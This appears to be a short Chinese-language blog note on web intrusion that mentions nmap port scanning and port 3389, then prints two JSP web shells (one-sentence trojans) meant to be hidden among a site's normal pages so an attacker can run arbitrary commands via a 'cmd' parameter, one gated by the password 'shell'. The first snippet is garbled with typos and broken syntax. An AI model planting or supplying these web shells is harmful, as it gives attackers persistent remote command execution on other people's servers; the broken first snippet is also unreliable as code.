# 收集目标信息-端口扫描【nmap】


有ip地址之后端口扫描获取信息

3389端口：远程连接端口

深度利用
getshell后门木马
asp或php后们文件与网站服务器web目录下正常的网页文件混在一起，达到控制网站服务器的目的

**jsp的一句话木马【指令】**
```
&lt;%@page import =&#34;java.io.*&#34;%&gt;
&lt;%String cmd = requests.getParameter(*cmd*);String output = &#34;&#34;;if(cmd!=null){String s = null;try{Process p = RUntime.getRuntime().exec(cmd);BUfferedReader sl = new BufferedReadwe(new InputStream(p.getInputStream()));while((s = readLine())!=null){output &#43;= s&#43;&#34;\r\n&#34;;}}catch()IOException e}{e.printStackTrace();}}out.println(output);%&gt;
```
上传成功后，用```?cmd=```可以输入指令
**jsp的一句话木马【连接】**
【密码：shell】
```
&lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=GBK&#34;
    pageEncoding=&#34;UTF-8&#34;%&gt;
&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;http://www.w3.org/TR/html4/loose.dtd&#34;&gt;
&lt;html&gt;

    &lt;head&gt;
        &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
        &lt;title&gt;一句话木马&lt;/title&gt;
    &lt;/head&gt;

    &lt;body&gt;
        &lt;%
        if (&#34;shell&#34;.equals(request.getParameter(&#34;pwd&#34;))) {
            java.io.InputStream input = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream();
            int len = -1;
            byte[] bytes = new byte[4092];
            out.print(&#34;&lt;pre&gt;&#34;);
            while ((len = input.read(bytes)) != -1) {
                out.println(new String(bytes, &#34;GBK&#34;));
            }
            out.print(&#34;&lt;/pre&gt;&#34;);
        }
    %&gt;
    &lt;/body&gt;

&lt;/html&gt;

```

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-%E6%94%B6%E9%9B%86%E7%9B%AE%E6%A0%87%E4%BF%A1%E6%81%AF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8Fnmap/  

